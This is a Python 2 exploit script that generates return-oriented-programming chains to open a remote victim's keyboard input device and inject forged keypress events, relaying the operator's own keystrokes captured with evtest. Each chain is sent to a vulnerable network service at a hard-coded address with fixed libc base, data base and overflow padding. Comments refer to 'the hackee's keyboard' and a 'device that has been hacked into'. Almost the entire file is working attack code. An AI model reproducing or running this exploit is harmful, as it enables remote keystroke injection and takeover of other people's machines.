import os
import re
import sys
import subprocess

import gadgets as g

from rop_shellcode import GenerateROPShellcode

"""
This program is to create ROP code for to emulate keyboard input events.
You require the event number for the keyboard and the program to exploited needs to be run as su.
This program also needs to be run as SU to detect key presses on the fly.
evtest needs to be installed. On a Debian system you can do that with 
    sudo apt-get install evtest
Also change the event number for your keyboard in the program - line 264
"""

mapping = {}

rop_code = ''
 
offset = 4

keys = []

generator = GenerateROPShellcode(padding=0, _id=0, json_file=None)

FNULL = open(os.devnull, 'w')

def open_file(file_name):
 
    global rop_code
    global offset
 
    rop_code = ''

    if len(file_name) % 4 > 0:
        null_offset = len(file_name) % 4
        for i in range (0, 4 - len(file_name) % 4):
            file_name = file_name + 'a'
    else:
        null_offset = 4
   
    tokens = re.findall('....', file_name)
 
    for token in tokens:
        commands = [g.pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + g.mov_eax_ecx]
        commands[0] = commands[0] + '0x'
        token = token[::-1]
        for char in token:
            commands[0] = commands[0] + str(hex(ord(char)))[2:]
        token = token[::-1]
        commands[0] = commands[0] + ": " + token + '\\n'
        commands[1] = commands[1] + str(hex(offset))
        commands[3] = token + commands[3]
        rop_code = rop_code + ''.join(commands)
        offset = offset + 4
 
    null_offset = null_offset + offset - 4
 
    rop_code = rop_code + g.pop_ebx_ret + 'Address    : 0x4: Offset for ' + tokens[0] + ' (.data base)\\n'
    rop_code = rop_code + g.xor_eax_eax
    rop_code = rop_code + g.pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\nAddress    : ' + str(hex(null_offset)) + ': Offset for NULL (.data base)\\n'
    rop_code = rop_code + g.mov_pedx_eax_mov_eax_edx
    rop_code = rop_code + g.xor_edx_edx_mov_eax_edx
    rop_code = rop_code + g.pop_ecx_pop_edx + 'Padding    : 0x02020202: (To neutralize pop ecx)\\nAddress    : ' + str(hex(null_offset + 4)) + ': Offset for 0x2 (.data base)\\n'
    rop_code = rop_code + g.mov_eax_0x2
    rop_code = rop_code + g.mov_pedx_eax_mov_eax_edx
    rop_code = rop_code + g.mov_ecx_eax_mov_edx_ecx_pop_ebx + 'Address    : 0x4: Offset for ' + tokens[0] + ' (.data base)\\n'
    rop_code = rop_code + g.xor_edx_edx_mov_eax_edx
    rop_code = rop_code + g.add_eax_0x5
    rop_code = rop_code + g.call_gs_10
    # copy file descriptor to ebx
    rop_code = rop_code + g.mov_edx_eax_mov_eax_edx
    rop_code = rop_code + g.mov_ebx_edx
 
 
def write_file(text, ip_addr, port_no):
 
    global rop_code
    global offset
 
    offset = offset + 4

    preserved_length = len(rop_code)
 
    event_type = '1'
    event_code = ''
    event_value = '1'
    i = 0

    for char in text:
        i = i + 1
        # event_type and event_code
        commands = [g.pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + g.mov_eax_ecx]
        commands[0] = commands[0] + '0x00' + hex(int(mapping[char.upper()]))[2:] + '0001' # event_type and event_code, example: 0104000
        commands[0] = commands[0] + ': event_type and event_code\\n'
        commands[1] = commands[1] + str(hex(offset + 8)) # leave the first 8 bytes for event.time in the input_event struct
        commands[3] = 'event_type and event_code' + commands[3]
        rop_code = rop_code + ''.join(commands)
        # event_value : 1
        commands = [g.pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + g.mov_eax_ecx]
        commands[0] = commands[0] + '0x00000001' # event_value, example: 0100000
        commands[0] = commands[0] + ': event_value\\n'
        commands[1] = commands[1] + str(hex(offset + 12))
        commands[3] = 'event_value' + commands[3]
        rop_code = rop_code + ''.join(commands)
        rop_code = rop_code + g.pop_ecx_pop_eax + 'Address    : ' + str(hex(offset)) + ' : Offset for struct\\nPadding    : 0x01010101: (To neutralize pop eax)\\n' 
        rop_code = rop_code + g.xor_eax_eax
        rop_code = rop_code + g.add_eax_0x10 + 'Padding    : 0x01010101: (To neutralize pop esi)\\nPadding    : 0x01010101: (To neutralize pop edi)\\n'
        rop_code = rop_code + g.mov_edx_eax_mov_eax_edx
        rop_code = rop_code + g.mov_eax_0x4
        rop_code = rop_code + g.call_gs_10
        # event_value : 0
        commands = [g.pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + g.mov_eax_ecx]
        commands[0] = commands[0] + '0x00000000' # event_value
        commands[0] = commands[0] + ': event_value\\n'
        commands[1] = commands[1] + str(hex(offset + 12))
        commands[3] = 'event_value' + commands[3]
        rop_code = rop_code + ''.join(commands)
        rop_code = rop_code + g.pop_ecx_pop_eax + 'Address    : ' + str(hex(offset)) + ' : Offset for struct\\nPadding    : 0x01010101: (To neutralize pop eax)\\n' 
        rop_code = rop_code + g.xor_eax_eax
        rop_code = rop_code + g.add_eax_0x10 + 'Padding    : 0x01010101: (To neutralize pop esi)\\nPadding    : 0x01010101: (To neutralize pop edi)\\n'
        rop_code = rop_code + g.mov_edx_eax_mov_eax_edx
        rop_code = rop_code + g.mov_eax_0x4
        rop_code = rop_code + g.call_gs_10
        if i == 4 or text.index(char) == len(text) - 1:
            generator.code = rop_code[:-2].replace('\\n', '\n')
            generator.shellcode = ''
            generator.addresses = []
            generator.construct_shellcode()
            rop_code = rop_code[:preserved_length]
            client = subprocess.Popen(['bin/simple_client', ip_addr, port_no, '/'], stdout=FNULL)
            while client.wait() != 0:
                client = subprocess.Popen(['bin/simple_client', ip_addr, port_no, '/'], stdout=FNULL)
            i = 0  

def send_keypresses():
    global keys
    if len(keys) > 0:
        ctr = 4 - len(keys) % 4
        if ctr == 4:
            ctr = 0
        for i in range(0, ctr):
            keys.append('ESC')
        print keys
        write_file(text=keys,ip_addr=generator.ip_addr, port_no=generator.port_no)
        keys = []

def main():
    # Keyboard mapping - this can be procured from the device that has been hacked into
    if len(sys.argv) < 3:
        print 'Event number of keyboard and path of keyboard mapping file needed.'
        sys.exit(1)

    global rop_code
    global offset
    global keys
    global generator

    mapping_file = open(sys.argv[2], 'r')
    lines = mapping_file.readlines()
    mapping_file.close()

    for line in lines:
        tokens = line.split(' ')
        mapping[tokens[3][5:-2]] = tokens[2]

    g.init(sys.argv[len(sys.argv)-1])

    # Hard-coded values
    generator.libc_base = '0xb7e17000'
    generator.data_base = '0x0804b080'
    generator.padding = 133
    generator.write_code = True
    generator.file_name = 'src/simple_client.c'
    generator.line_num = 11
    # Create two members for the object so that the ip_addr and port_no can be accessed anywhere
    generator.ip_addr = '192.168.1.3'
    generator.port_no = '10000'

    # generator.libc_base = hex(int(str(raw_input('Enter the libc base (format - 0xdeadbeef): ')).replace('L', ''), 16))
    # generator.data_base = hex(int(str(raw_input('Enter the data base (format - 0xdeadbeef): ')).replace('L', ''), 16))
    # generator.padding = int(raw_input('Padding: '))
    # generator.print_code = str(raw_input('Would you like to write the code into a file (y/n)? ')) == 'y'
    # if generator.print_code:
    #     generator.file_name = str(raw_input('File name: '))
    #     generator.line_num = int(raw_input('Which line should the code be written onto? '))
    # generator.ip_addr = str(raw_input('IP address of server: '))
    # generator.port_no = str(raw_input('Port number: '))
    
    # This event number should be the hackee's keyboard event number
    open_file(file_name='/dev/input/event' + sys.argv[1])

    # This event number should be the hacker's keyboard event number
    proc = subprocess.Popen(['evtest', '/dev/input/event3'], stdout=subprocess.PIPE)
    expr = re.compile(r'Event: time [0-9]*\.[0-9]*, type [0-9]+ \(EV_KEY\), code ([0-9]+) \(KEY_([A-Z0-9]+)\), value 1')
    keys = []
    send_keypresses()
    while True:
        line = proc.stdout.readline()
        matches = re.match(expr, line)
        if matches:
            if matches.group(2) == 'RIGHTSHIFT':
                send_keypresses()
            else:
                keys.append(matches.group(2))

if __name__ == '__main__':
    main()
